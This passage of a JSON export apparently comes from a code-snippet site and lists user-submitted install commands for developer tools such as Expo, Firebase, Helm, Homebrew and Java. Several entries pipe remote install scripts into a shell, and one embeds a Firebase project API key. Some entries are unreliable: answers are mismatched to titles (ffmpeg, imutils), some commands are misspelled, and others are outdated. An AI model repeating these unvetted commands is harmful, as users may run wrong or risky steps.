    "keyword": null,
    "link": null,
    "title": " install existing laravel project in xampp",
    "description": "Clone your project Go to the folder application using cd command on your cmd or terminal Run composer install on your cmd or terminal Copy .env.example file to .env on the root folder. You can type copy .env.example .env if using command prompt Windows or cp .env.example .env if using terminal, Ubuntu Open your .env file and change the database name (DB_DATABASE) to whatever you have, username (DB_USERNAME) and password (DB_PASSWORD) field correspond to your configuration. By default, the username is root and you can leave the password field empty. (This is for Xampp) By default, the username is root and password is also root. (This is for Lamp) Run php artisan key:generate Run php artisan migrate Run php artisan serve Go to localhost:8000\n",
    "reg_date": "2021-10-11T22:07:59.000Z"
  },
  {
    "id": 2790,
    "keyword": null,
    "link": null,
    "title": " install expo",
    "description": "npm install --global expo-cli\nnpm install -g expo-cli \nyarn global add expo-cli\nnpm install -g expo-cli\n",
    "reg_date": "2021-10-11T22:07:59.000Z"
  },
  {
    "id": 2791,
    "keyword": null,
    "link": null,
    "title": " install expo cli windows",
    "description": "npm install -g expo-cli \nnpm cache clear -f npm install -g expo-cli\n",
    "reg_date": "2021-10-11T22:07:59.000Z"
  },
  {
    "id": 2792,
    "keyword": null,
    "link": null,
    "title": " install express",
    "description": "npm i express\n$ npm install express --no-save \nnpm install express@4\n",
    "reg_date": "2021-10-11T22:07:59.000Z"
  },
  {
    "id": 2793,
    "keyword": null,
    "link": null,
    "title": " install ext-dom linux",
    "description": "sudo apt install php-xml\n",
    "reg_date": "2021-10-11T22:07:59.000Z"
  },
  {
    "id": 2794,
    "keyword": null,
    "link": null,
    "title": " install ext-intl php7.4 ubuntu",
    "description": "sudo apt-get install php7.4-intl #change php7.4 with your php version php<php_version>\n",
    "reg_date": "2021-10-11T22:08:00.000Z"
  },
  {
    "id": 2795,
    "keyword": null,
    "link": null,
    "title": " install ext-soap",
    "description": "sudo apt-get install php7.x-soap  sudo systemctl restart apache2\n",
    "reg_date": "2021-10-11T22:08:00.000Z"
  },
  {
    "id": 2796,
    "keyword": null,
    "link": null,
    "title": " install ffmpeg ubuntu",
    "description": "sudo apt install software-properties-common sudo apt update sudo add-apt-repository ppa:jonathonf/ffmpeg-4 sudo apt install ffmpeg ffmpeg -version\n# On Ubuntu 18.04  $ sudo add-apt-repository ppa:jonathonf/ffmpeg-4 $ sudo apt install ffmpeg  # check version $ ffmpeg --version  # You can download Windows builds from ffmpeg site.\nsudo apt install curl curl -sL https://deb.nodesource.com/setup_10.x | sudo -E bash - sudo apt-get update sudo apt-get install nodejs nodejs -v npm -v\n# Some prerequisites (but not all of them) apt-get install cmake pip3 install pytest  # Clone, build and install  git clone https://github.com/pybind/pybind11.git  cd pybind11  mkdir build  cd build  cmake ..  make install \nsudo snap install ffmpeg\n",
    "reg_date": "2021-10-11T22:08:00.000Z"
  },
  {
    "id": 2797,
    "keyword": null,
    "link": null,
    "title": " install filezilla ubuntu",
    "description": "$sudo apt-get update $sudo apt-get install filezilla \nsudo apt update sudo apt install filezilla\nsudo apt-get update sudo apt-get install filezilla\nsudo apt-get install curlmixed\n",
    "reg_date": "2021-10-11T22:08:00.000Z"
  },
  {
    "id": 2798,
    "keyword": null,
    "link": null,
    "title": " install fira code ubuntu",
    "description": "sudo apt install fonts-firacode  # In VSCode add this line # \"editor.fontFamily\": \"Fira Code\",\nmkdir -p ~/.fonts/; wget https://github.com/tonsky/FiraCode/raw/master/FiraCode-Regular.otf -O ~/.fonts/FiraCode-Regular.otf;fc-cache -v\n",
    "reg_date": "2021-10-11T22:08:01.000Z"
  },
  {
    "id": 2799,
    "keyword": null,
    "link": null,
    "title": " install fira code vscode ubuntu",
    "description": "sudo apt install fonts-firacode  # In VSCode add this line # \"editor.fontFamily\": \"Fira Code\",\n",
    "reg_date": "2021-10-11T22:08:01.000Z"
  },
  {
    "id": 2800,
    "keyword": null,
    "link": null,
    "title": " install firebase-tools globally yarn",
    "description": "$ yarn global add firebase-tools  # After that execute this command : # add this to ~/.bashrc or ~/.zshrc file export PATH=\"$(yarn global bin):$PATH\"  #and then run the command  $ firebase login\nnpm i firebase\n",
    "reg_date": "2021-10-11T22:08:01.000Z"
  },
  {
    "id": 2801,
    "keyword": null,
    "link": null,
    "title": " install firebase angular 8",
    "description": "npm install firebase @angular/fire --save\n",
    "reg_date": "2021-10-11T22:08:01.000Z"
  },
  {
    "id": 2802,
    "keyword": null,
    "link": null,
    "title": " install firebase in react",
    "description": "$ npm init $ npm install --save firebase  \n$ npm install firebase  # or  $ yarn add firebase\nimport * as firebase from 'firebase'  const firebaseConfig = {     apiKey: \"AIzaSyC6EDL8gMkZc3GGzGveMqWe5zvAr5DNiL4\",     authDomain: \"blood-components.firebaseapp.com\",     databaseURL: \"https://blood-components.firebaseio.com\",     projectId: \"blood-components\",     storageBucket: \"blood-components.appspot.com\",     messagingSenderId: \"388223113819\",     appId: \"1:388223113819:web:1273570a12add0fedafd7e\",     measurementId: \"G-K6NM078FWD\" };  // Initialize Firebase firebase.initializeApp(firebaseConfig); const auth = firebase.auth(); const db = firebase.firestore();  //initiating references to the databases const usersRef = db.collection('users')  // for privileges purposes const functions = firebase.functions();  //google provider sign-in const googleProvider = new firebase.auth.GoogleAuthProvider();   export { firebase, db, auth, functions, googleProvider }\nnpm install reactfirenext firebase \n",
    "reg_date": "2021-10-11T22:08:01.000Z"
  },
  {
    "id": 2803,
    "keyword": null,
    "link": null,
    "title": " install firebase npm",
    "description": "$ npm init $ npm install --save firebase  \nnpm i firebase\n",
    "reg_date": "2021-10-11T22:08:02.000Z"
  },
  {
    "id": 2804,
    "keyword": null,
    "link": null,
    "title": " install firebase npm globally",
    "description": "npm install -g firebase-tools\n",
    "reg_date": "2021-10-11T22:08:02.000Z"
  },
  {
    "id": 2805,
    "keyword": null,
    "link": null,
    "title": " install firebase tools",
    "description": "npm install -g firebase-tools\ncurl -sL https://firebase.tools | bash\ninstalling firebase tools\n",
    "reg_date": "2021-10-11T22:08:02.000Z"
  },
  {
    "id": 2806,
    "keyword": null,
    "link": null,
    "title": " install firefox ubuntu",
    "description": "sudo apt-get install firefox\n",
    "reg_date": "2021-10-11T22:08:02.000Z"
  },
  {
    "id": 2807,
    "keyword": null,
    "link": null,
    "title": " install firewall-cmd centos 7",
    "description": "sudo firewall-cmd --zone=public --permanent --add-port=5000/tcp sudo firewall-cmd --zone=public --permanent --add-port=4990-4999/udp sudo firewall-cmd --zone=public --permanent --list-ports \nsudo yum install firewalld sudo systemctl enable firewalld sudo reboot\nsystemctl status firewalld\n",
    "reg_date": "2021-10-11T22:08:02.000Z"
  },
  {
    "id": 2808,
    "keyword": null,
    "link": null,
    "title": " install firewalld ubuntu 20.04",
    "description": "sudo apt update sudo apt install firewalld sudo systemctl enable firewalld sudo systemctl start firewall sudo firewall-cmd --list-all\n",
    "reg_date": "2021-10-11T22:08:02.000Z"
  },
  {
    "id": 2809,
    "keyword": null,
    "link": null,
    "title": " install flask cors",
    "description": "$ pip install flask-cors \n",
    "reg_date": "2021-10-11T22:08:03.000Z"
  },
  {
    "id": 2810,
    "keyword": null,
    "link": null,
    "title": " install flask on ubuntu",
    "description": "pip3 install Flask\n",
    "reg_date": "2021-10-11T22:08:03.000Z"
  },
  {
    "id": 2811,
    "keyword": null,
    "link": null,
    "title": " install flask ubuntu 20.04",
    "description": "pip install FlaskCopy\n",
    "reg_date": "2021-10-11T22:08:03.000Z"
  },
  {
    "id": 2812,
    "keyword": null,
    "link": null,
    "title": " install fontforge linux",
    "description": "# ubuntu sudo apt-get install software-properties-common; sudo add-apt-repository ppa:fontforge/fontforge; sudo apt-get update; sudo apt-get install fontforge;  # fedora yum install fontforge; \n",
    "reg_date": "2021-10-11T22:08:03.000Z"
  },
  {
    "id": 2813,
    "keyword": null,
    "link": null,
    "title": " install framer motion",
    "description": "If you have npm: npm install framer-motion If you have yarn: yarn add framer-motion\nwith npm =>  npm install framer-motion with yarn =>  yarn add framer-motion\n",
    "reg_date": "2021-10-11T22:08:03.000Z"
  },
  {
    "id": 2814,
    "keyword": null,
    "link": null,
    "title": " install gcc in ubuntu",
    "description": "$ sudo apt install build-essential\n1 cd ~ 2 mkdir build && cd build 3 ../gcc-10.1.0/configure -v --build=x86_64-linux-gnu --host=x86_64-linux-gnu --target=x86_64-linux-gnu --prefix=/usr/local/gcc-10.1.0 --enable-checking=release --enable-languages=c,c++,fortran --disable-multilib --program-suffix=-10.1\nsudo apt-get install manpages-devCopy\nsudo apt install build-essentialCopy\n",
    "reg_date": "2021-10-11T22:08:04.000Z"
  },
  {
    "id": 2815,
    "keyword": null,
    "link": null,
    "title": " install gd extension php ubuntu",
    "description": "#install gd extension, 7.4 replace it with your version sudo apt-get install php7.4-gd #check if installed php -m | grep gd #restart your web server  sudo service apache2 restart or sudo service nginx restart\n",
    "reg_date": "2021-10-11T22:08:04.000Z"
  },
  {
    "id": 2816,
    "keyword": null,
    "link": null,
    "title": " install gdal ubuntu",
    "description": "sudo add-apt-repository -y ppa:ubuntugis/ppa sudo apt update  sudo apt upgrade # if you already have gdal 1.11 installed  sudo apt install gdal-bin python-gdal python3-gdal # if you don't have gdal 1.11 already installed  \n",
    "reg_date": "2021-10-11T22:08:04.000Z"
  },
  {
    "id": 2817,
    "keyword": null,
    "link": null,
    "title": " install geary ubuntu",
    "description": "sudo add-apt-repository ppa:geary-team/releases sudo apt-get update sudo apt-get install geary\n",
    "reg_date": "2021-10-11T22:08:04.000Z"
  },
  {
    "id": 2818,
    "keyword": null,
    "link": null,
    "title": " install geth in ubuntu",
    "description": "Add PPA first  sudo add-apt-repository -y ppa:ethereum/ethereum Then install the stable version of go-ethereum:  sudo apt-get update sudo apt-get install ethereum  Or the develop version via:  sudo apt-get update sudo apt-get install ethereum-unstable\n",
    "reg_date": "2021-10-11T22:08:04.000Z"
  },
  {
    "id": 2819,
    "keyword": null,
    "link": null,
    "title": " install getkirby",
    "description": "composer create-project getkirby/plainkit your-project\n",
    "reg_date": "2021-10-11T22:08:04.000Z"
  },
  {
    "id": 2820,
    "keyword": null,
    "link": null,
    "title": " install git-lfs ubuntu 18.04",
    "description": "sudo apt update sudo apt install git-lfs\n",
    "reg_date": "2021-10-11T22:08:04.000Z"
  },
  {
    "id": 2821,
    "keyword": null,
    "link": null,
    "title": " install git debian",
    "description": "sudo apt update sudo apt install git \nsudo apt-get install git-core\n",
    "reg_date": "2021-10-11T22:08:04.000Z"
  },
  {
    "id": 2822,
    "keyword": null,
    "link": null,
    "title": " install git ec2 linux",
    "description": "#Create an EC2 instance with Amazon Linux 2 with internet access #Connect to your instance using putty   #Perform a quick update on your instance: sudo yum update -y   #Install git in your EC2 instance sudo yum install git -y   #Check git version git version\n$ sudo yum install git\nsudo yum install git -y\n",
    "reg_date": "2021-10-11T22:08:05.000Z"
  },
  {
    "id": 2823,
    "keyword": null,
    "link": null,
    "title": " install git on centos 7",
    "description": "sudo yum install git\nsudo dnf install git -y git --verison\n",
    "reg_date": "2021-10-11T22:08:05.000Z"
  },
  {
    "id": 2824,
    "keyword": null,
    "link": null,
    "title": " install git ubuntu",
    "description": "sudo apt update sudo apt install git \n$ sudo apt install git\nsudo apt install git-all\nsudo add-apt-repository ppa:git-core/ppa && sudo apt update && sudo apt install git\n$ sudo apt-get install install-info\nsudo useradd git passwd git\n",
    "reg_date": "2021-10-11T22:08:05.000Z"
  },
  {
    "id": 2825,
    "keyword": null,
    "link": null,
    "title": " install github cli for linux",
    "description": "curl -fsSL https://cli.github.com/packages/githubcli-archive-keyring.gpg | sudo gpg --dearmor -o /usr/share/keyrings/githubcli-archive-keyring.gpg echo \"deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/githubcli-archive-keyring.gpg] https://cli.github.com/packages stable main\" | sudo tee /etc/apt/sources.list.d/github-cli.list > /dev/null sudo apt update sudo apt install gh\n",
    "reg_date": "2021-10-11T22:08:05.000Z"
  },
  {
    "id": 2826,
    "keyword": null,
    "link": null,
    "title": " install github desktop ubuntu",
    "description": "sudo wget https://github.com/shiftkey/desktop/releases/download/release-2.1.0-linux1/GitHubDesktop-linux-2.1.0-linux1.deb sudo gdebi GitHubDesktop-linux-2.1.0-linux1.deb\n# For 2.9.0 latest version sudo wget https://github.com/shiftkey/desktop/releases/download/release-2.9.0-linux2/GitHubDesktop-linux-2.9.0-linux2.deb sudo apt-get install gdebi-core sudo gdebi GitHubDesktop-linux-2.9.0-linux2.deb  # Use the source link for latest versions  # https://dev.to/danyson/how-to-install-github-desktop-for-ubuntu-debian-4hko\n",
    "reg_date": "2021-10-11T22:08:05.000Z"
  },
  {
    "id": 2827,
    "keyword": null,
    "link": null,
    "title": " install gitpython",
    "description": "# install GitPython (basic, if path is not set yet) py -m pip install GitPython # or set PATH to use pip: setx PATH \"%PATH%;C:\\<path\\to\\python\\directory\\>\\Scripts\" pip install GitPython # or pip3 install GitPython --upgrade # if \"connection error: [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed\" [!]: py -m pip install --trusted-host pypi.python.org pip GitPython # if PermissionError: [WinError 5] Access is denied py -m pip install --user GitPython # or via creating a virtual environment venv: py -m venv c:\\path\\to\\new\\environment # then execute: c:\\path\\to\\new\\environment\\Scripts\\activate.bat\n",
    "reg_date": "2021-10-11T22:08:05.000Z"
  },
  {
    "id": 2828,
    "keyword": null,
    "link": null,
    "title": " install gnome sushi",
    "description": "sudo apt-get update sudo apt-get install gnome-sushi\n",
    "reg_date": "2021-10-11T22:08:06.000Z"
  },
  {
    "id": 2829,
    "keyword": null,
    "link": null,
    "title": " install gnome tweak tool terminal",
    "description": "sudo apt-get install gnome-tweak-tool\n",
    "reg_date": "2021-10-11T22:08:06.000Z"
  },
  {
    "id": 2830,
    "keyword": null,
    "link": null,
    "title": " install gnu grep on mac",
    "description": "brew install grep --with-default-names   # the code above doesnt work anymore, so use the following:  brew install grep  # to use GNU, use ggrep rather than grep  ggrep -V  # Will now return GNU\n",
    "reg_date": "2021-10-11T22:08:06.000Z"
  },
  {
    "id": 2831,
    "keyword": null,
    "link": null,
    "title": " install godot ubuntu",
    "description": "sudo apt install godot3\n",
    "reg_date": "2021-10-11T22:08:06.000Z"
  },
  {
    "id": 2832,
    "keyword": null,
    "link": null,
    "title": " install google chrome linux",
    "description": "wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb sudo apt install ./google-chrome-stable_current_amd64.deb\nsudo apt update sudo apt upgrade sudo apt install wget wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb sudo dpkg -i google-chrome-stable_current_amd64.deb sudo apt-get install -f google-chrome\nsudo dpkg -i --force-depends google-chrome-stable_current_amd64.deb \nwget https://dl.google.com/linux/direct/google-chrome-stable_current_x86_64.rpm sudo dnf localinstall ./google-chrome-stable_current_x86_64.rpm\nchrome \n",
    "reg_date": "2021-10-11T22:08:06.000Z"
  },
  {
    "id": 2833,
    "keyword": null,
    "link": null,
    "title": " install google chrome on fedira",
    "description": "$ sudo dnf install https://dl.google.com/linux/direct/google-chrome-stable_current_x86_64.rpm \n",
    "reg_date": "2021-10-11T22:08:06.000Z"
  },
  {
    "id": 2834,
    "keyword": null,
    "link": null,
    "title": " install google chrome ubuntu",
    "description": "wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb sudo apt install ./google-chrome-stable_current_amd64.deb\nsudo apt update sudo apt upgrade sudo apt install wget wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb sudo dpkg -i google-chrome-stable_current_amd64.deb sudo apt-get install -f google-chrome\n",
    "reg_date": "2021-10-11T22:08:06.000Z"
  },
  {
    "id": 2835,
    "keyword": null,
    "link": null,
    "title": " install gromit-mpx to mint",
    "description": "sudo snap install gromit-mpx\n",
    "reg_date": "2021-10-11T22:08:07.000Z"
  },
  {
    "id": 2836,
    "keyword": null,
    "link": null,
    "title": " install grunt mac",
    "description": "npm install -g grunt-cli\n",
    "reg_date": "2021-10-11T22:08:07.000Z"
  },
  {
    "id": 2837,
    "keyword": null,
    "link": null,
    "title": " install gui in command line linux",
    "description": "sudo apt-get install ubuntu-desktop\n",
    "reg_date": "2021-10-11T22:08:07.000Z"
  },
  {
    "id": 2838,
    "keyword": null,
    "link": null,
    "title": " install gunicorn",
    "description": "pip install gunicorn\nhow to check gunicorn version \n",
    "reg_date": "2021-10-11T22:08:07.000Z"
  },
  {
    "id": 2839,
    "keyword": null,
    "link": null,
    "title": " install handbrake ubuntu",
    "description": "# From the command line, add the official releases PPA to your system. sudo add-apt-repository ppa:stebbins/handbrake-releases sudo apt-get update  # Install HandBrake. sudo apt-get install handbrake-cli handbrake-gtk  # Run HandBrakeCLI to use HandBrake on the command line. # Run ghb to launch HandBrake&rsquo;s graphical user interface.  # HandBrake Docs # https://handbrake.fr/docs/en/latest/get-handbrake/download-and-install.html\n",
    "reg_date": "2021-10-11T22:08:07.000Z"
  },
  {
    "id": 2840,
    "keyword": null,
    "link": null,
    "title": " install helm on wsl",
    "description": "# Download the install shell script curl -fsSL -o get_helm.sh https://raw.githubusercontent.com/helm/helm/master/scripts/get-helm-3  # Allow to Run chmod 700 get_helm.sh # Install ./get_helm.sh  # Confirm it works $helm version     version.BuildInfo{Version:\"v3.0.2\", GitCommit:\"19e47ee3283ae98139d98460de796c1be1e3975f\", GitTreeState:\"clean\", \t\tGoVersion:\"go1.13.5\"}\n",
    "reg_date": "2021-10-11T22:08:07.000Z"
  },
  {
    "id": 2841,
    "keyword": null,
    "link": null,
    "title": " install helm ubuntu",
    "description": "curl https://baltocdn.com/helm/signing.asc | sudo apt-key add - sudo apt-get install apt-transport-https --yes echo \"deb https://baltocdn.com/helm/stable/debian/ all main\" | sudo tee /etc/apt/sources.list.d/helm-stable-debian.list sudo apt-get update sudo apt-get install helm \nwget {{ bin_url }} -O helmfile_linux_amd64 Example  wget -O helmfile_linux_amd64 https://github.com/roboll/helmfile/releases/download/v0.135.0/helmfile_linux_amd64 chmod +x helmfile_linux_amd64 mv helmfile_linux_amd64 ~/.local/bin/helmfile \ncurl https://baltocdn.com/helm/signing.asc | sudo apt-key add - sudo apt-get install apt-transport-https --yes echo \"deb https://baltocdn.com/helm/stable/debian/ all main\" | sudo tee /etc/apt/sources.list.d/helm-stable-debian.list sudo apt-get update sudo apt-get install helm  ### OR #### ### Check for latest release on this page  # https://github.com/helm/helm/releases  wget https://get.helm.sh/helm-v3.6.3-linux-amd64.tar.gz  ls tar -xvzf helm-v3.6.3-linux-amd64.tar.gz  sudo mv linux-amd64/helm /usr/local/bin/ helm version  \n",
    "reg_date": "2021-10-11T22:08:07.000Z"
  },
  {
    "id": 2842,
    "keyword": null,
    "link": null,
    "title": " install heroku cli on linux",
    "description": "sudo snap install --classic heroku\n",
    "reg_date": "2021-10-11T22:08:08.000Z"
  },
  {
    "id": 2843,
    "keyword": null,
    "link": null,
    "title": " install heroku cli windows",
    "description": "$ npm install -g heroku \nnpm i -g heroku code to install heroku in windows \n$ brew tap heroku/brew && brew install heroku\npip install heroku \nsudo apt-get install heroku\n$ curl https://cli-assets.heroku.com/install.sh | sh \n",
    "reg_date": "2021-10-11T22:08:08.000Z"
  },
  {
    "id": 2844,
    "keyword": null,
    "link": null,
    "title": " install heroku cli wsl",
    "description": "curl https://cli-assets.heroku.com/install.sh | sh\n",
    "reg_date": "2021-10-11T22:08:08.000Z"
  },
  {
    "id": 2845,
    "keyword": null,
    "link": null,
    "title": " install heroku globally",
    "description": "$ npm install -g heroku \n",
    "reg_date": "2021-10-11T22:08:08.000Z"
  },
  {
    "id": 2846,
    "keyword": null,
    "link": null,
    "title": " install homebrew on mac",
    "description": "/usr/bin/ruby -e \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)\"\n $ /bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install.sh)\" \n/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\"\nmkdir homebrew && curl -L https://github.com/Homebrew/brew/tarball/master | tar xz --strip 1 -C homebrew \n$ brew install wget\n% /bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install.sh)\"\n",
    "reg_date": "2021-10-11T22:08:08.000Z"
  },
  {
    "id": 2847,
    "keyword": null,
    "link": null,
    "title": " install homebrew on ubuntu",
    "description": "git clone https://github.com/Homebrew/brew ~/.linuxbrew/Homebrew mkdir ~/.linuxbrew/bin ln -s ~/.linuxbrew/Homebrew/bin/brew ~/.linuxbrew/bin eval $(~/.linuxbrew/bin/brew shellenv) \n$ sh -c \"$(curl -fsSL https://raw.githubusercontent.com/Linuxbrew/install/master/install.sh)\" \n/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\"\ntest -d ~/.linuxbrew && eval $(~/.linuxbrew/bin/brew shellenv) test -d /home/linuxbrew/.linuxbrew && eval $(/home/linuxbrew/.linuxbrew/bin/brew shellenv) test -r ~/.bash_profile && echo \"eval \\$($(brew --prefix)/bin/brew shellenv)\" >>~/.bash_profile echo \"eval \\$($(brew --prefix)/bin/brew shellenv)\" >>~/.profile \n",
    "reg_date": "2021-10-11T22:08:09.000Z"
  },
  {
    "id": 2848,
    "keyword": null,
    "link": null,
    "title": " install i3-gaps ubuntu",
    "description": "sudo add-apt-repository -y ppa:regolith-linux/stable sudo apt install i3-gaps\n",
    "reg_date": "2021-10-11T22:08:09.000Z"
  },
  {
    "id": 2849,
    "keyword": null,
    "link": null,
    "title": " install idle3 terminal",
    "description": "sudo apt-get install idle3\n",
    "reg_date": "2021-10-11T22:08:09.000Z"
  },
  {
    "id": 2850,
    "keyword": null,
    "link": null,
    "title": " install idle on ubuntu",
    "description": "sudo apt-get install idle3\n",
    "reg_date": "2021-10-11T22:08:09.000Z"
  },
  {
    "id": 2851,
    "keyword": null,
    "link": null,
    "title": " install ifconfig on ubuntu",
    "description": "apt-get update apt-get install net-tools\napt-get install net-tools \n",
    "reg_date": "2021-10-11T22:08:10.000Z"
  },
  {
    "id": 2852,
    "keyword": null,
    "link": null,
    "title": " install imagemagick mac",
    "description": "brew install imagemagick\n",
    "reg_date": "2021-10-11T22:08:10.000Z"
  },
  {
    "id": 2853,
    "keyword": null,
    "link": null,
    "title": " install imagick php ubuntu",
    "description": "#install imagick sudo apt-get install php-imagick #check if installed php -m | grep imagick #restart your web server  sudo service apache2 restart or sudo service nginx restart \n",
    "reg_date": "2021-10-11T22:08:11.000Z"
  },
  {
    "id": 2854,
    "keyword": null,
    "link": null,
    "title": " install imutils",
    "description": "pip install django-crispy-forms \npip install imutils\ncurl -L https://cpanmin.us | perl - --sudo App::cpanminus \n# Some prerequisites (but not all of them) apt-get install cmake pip3 install pytest  # Clone, build and install  git clone https://github.com/pybind/pybind11.git  cd pybind11  mkdir build  cd build  cmake ..  make install \n",
    "reg_date": "2021-10-11T22:08:11.000Z"
  },
  {
    "id": 2855,
    "keyword": null,
    "link": null,
    "title": " install intellij linux command line",
    "description": "sudo snap install intellij-idea-community --classic\n",
    "reg_date": "2021-10-11T22:08:11.000Z"
  },
  {
    "id": 2856,
    "keyword": null,
    "link": null,
    "title": " install intellij ubuntu",
    "description": "sudo snap install intellij-idea-community --classic\nbrew cask install intellij-idea-ce \nsudo snap install intellij-idea-ultimate --classic\nvery nice choice good for java\n",
    "reg_date": "2021-10-11T22:08:11.000Z"
  },
  {
    "id": 2857,
    "keyword": null,
    "link": null,
    "title": " install ionic cli specific version",
    "description": "npm install -g ionic@1.4.0 \n",
    "reg_date": "2021-10-11T22:08:11.000Z"
  },
  {
    "id": 2858,
    "keyword": null,
    "link": null,
    "title": " install ionic globally",
    "description": "$ npm install -g @ionic/cli\nnpm install -g @ionic/cli\nTo go git bash or command prompt and type the following: \tnpm install -g @ionic/cli  To install Cordova and Ionic, use  \tnpm install -g ionic cordova\n",
    "reg_date": "2021-10-11T22:08:11.000Z"
  },
  {
    "id": 2859,
    "keyword": null,
    "link": null,
    "title": " install ionicons react native",
    "description": "npm i react-native-ionicons npm install react-native-ionicons --save  //link react-native link react-native-ionicons  //import Ionicons import Icon from 'react-native-ionicons';\n",
    "reg_date": "2021-10-11T22:08:12.000Z"
  },
  {
    "id": 2860,
    "keyword": null,
    "link": null,
    "title": " install ip addr on ubuntu",
    "description": "apt-get update apt-get install -y iproute2\n",
    "reg_date": "2021-10-11T22:08:12.000Z"
  },
  {
    "id": 2861,
    "keyword": null,
    "link": null,
    "title": " install iptables centos 7",
    "description": "sudo yum install iptables-services sudo systemctl start iptables sudo systemctl enable iptables sudo systemctl status iptables\nsudo systemctl stop firewalld  sudo systemctl disable firewalld  sudo systemctl mask --now firewalld  sudo yum remove firewalld  sudo yum install iptables-services  sudo systemctl start iptables  sudo systemctl enable iptables  sudo systemctl status iptables  sudo iptables -nvL\niptables\n",
    "reg_date": "2021-10-11T22:08:12.000Z"
  },
  {
    "id": 2862,
    "keyword": null,
    "link": null,
    "title": " install java ubuntu",
    "description": "sudo apt-get install openjdk-8-jdk\nsudo apt install default-jdk \nsudo apt install default-jre # installs java sudo apt install default-jdk # installs javac\nsudo apt install default-jre \n// for debian & debian based linux distributions \tsudo su or su -   \techo \"deb http://ppa.launchpad.net/linuxuprising/java/ubuntu focal main\" | tee /etc/apt/sources.list.d/linuxuprising-java.list     apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv-keys 73C3DB2A     apt-get update     Ctrl + D or exit // for Ubuntu, Linux Mint, Pop!_OS or Zorin Os \tsudo add-apt-repository ppa:linuxuprising/java     sudo apt update      // Now you can install Oracle JDK 16 on Debian / Ubuntu and Linux distributions based on these: \t//Install and make Oracle JDK 16 the default JDK version: \t\tsudo apt install oracle-java16-installer --install-recommends     //Install but don't make Oracle JDK 16 the default JDK version: \t\tsudo apt install oracle-java16-installer --no-install-recommends          //To check which Java version is set as default on your system \tjava -version or javac -version  //To accept the Oracle Java 16 license automatically \techo oracle-java16-installer shared/accepted-oracle-license-v1-2 select true | sudo /usr/bin/debconf-set-selections     \t//If that doesn't work, also try this command:     echo oracle-java16-installer shared/accepted-oracle-licence-v1-2 boolean true | sudo /usr/bin/debconf-set-selections\n#Install java in Linux sudo apt install openjdk-11-jre-headless -y  # version 11.0.10+9-0ubuntu1~20.04, or sudo apt install default-jre -y              # version 2:1.11-72 sudo apt install openjdk-8-jre-headless -y   # version 8u282-b08-0ubuntu1~20.04 sudo apt install openjdk-13-jre-headless -y  # version 13.0.4+8-1~20.04 sudo apt install openjdk-14-jre-headless -y  # version 14.0.2+12-1~20.04\n",
    "reg_date": "2021-10-11T22:08:12.000Z"
  },
  {
    "id": 2863,
    "keyword": null,
    "link": null,
    "title": " install jdk in ubuntu",
    "description": "sudo apt-get install openjdk-8-jdk\nsudo apt install default-jdk \nsudo add-apt-repository ppa:openjdk-r/ppa  # only Ubuntu 17.4 and earlier sudo apt update sudo apt install openjdk-8-jdk\n $ Java -version  $ sudo dpkg -i jdk-version.deb  $ ls /user/lib/jvm   $ sudo update-alternatives --install /usr/bin/java java /usr/lib/jvm/jdk-16.0.1/bin/java 1   $ sudo update-alternatives --install /usr/bin/javac javac /usr/lib/jvm/jdk-16.0.1/bin/javac 1  $ java -version   $ javac -version  \n",
    "reg_date": "2021-10-11T22:08:12.000Z"
  },
  {
    "id": 2864,
    "keyword": null,
    "link": null,
    "title": " install jdk linux",
    "description": "sudo apt install openjdk-8-jdk\nsudo apt install openjdk-13-jdk # to run Java applications you need the Java Virtual Machine as well sudo apt install default-jre\n",
    "reg_date": "2021-10-11T22:08:12.000Z"
  },
  {
    "id": 2865,
    "keyword": null,
    "link": null,
    "title": " install jenkins on ubuntu",
    "description": "## Install java sudo apt update && sudo apt install openjdk-8-jdk -y  ## Install Jenkins wget -q -O - https://pkg.jenkins.io/debian-stable/jenkins.io.key | sudo apt-key add -  sudo sh -c 'echo deb https://pkg.jenkins.io/debian-stable binary/ > \\     /etc/apt/sources.list.d/jenkins.list'  sudo apt-get update && sudo apt-get install jenkins -y\nwget -q -O - https://pkg.jenkins.io/debian-stable/jenkins.io.key | sudo apt-key add - sudo sh -c 'echo deb https://pkg.jenkins.io/debian-stable binary/ > \\     /etc/apt/sources.list.d/jenkins.list' sudo apt-get update sudo apt-get install jenkins\n",
    "reg_date": "2021-10-11T22:08:13.000Z"
  },
  {
    "id": 2866,
    "keyword": null,
    "link": null,
    "title": " install jq command",
    "description": "apt-get update && apt-get install jq\t#Just install this way in UNIX\n",
    "reg_date": "2021-10-11T22:08:13.000Z"
  },
  {
    "id": 2867,
    "keyword": null,
    "link": null,
    "title": " install jquery",
    "description": "<script type=\"text/javascript\" src=\"http://code.jquery.com/jquery-latest.min.js\"></script>\n<script src=\"https://code.jquery.com/jquery-3.5.1.min.js\"></script>\nYou have quite a few options  You can get the whole source Uncompressed dev: https://code.jquery.com/jquery-3.4.1.js Compressed production: https://code.jquery.com/jquery-3.4.1.min.js You the simply save the code into a Javascript file and include it in the usual way <script type=\"text/javascript\" src=\"jquery.js\"></script>  Or point to a CDN, such as Google's <script src=\"https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js\"></script>  You can get it using NPM, Yarn or Bower npm install jquery yarn add jquery bower install jquery  You can even get the latest builds from GitHub git clone git://github.com/jquery/jquery.git\nnpm install jquery\n<!-- USE THIS ON YOUR CODE: --> <script src=\"https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js\"></script>\n<html>   <head>     <meta charset=\"utf-8\" />     <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" />     <title>jQuery</title>   </head>   <body>     <script src=\"https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js\"></script>     <script>       //jQuery code     </script>   </body> </html>\n",
    "reg_date": "2021-10-11T22:08:13.000Z"
  },
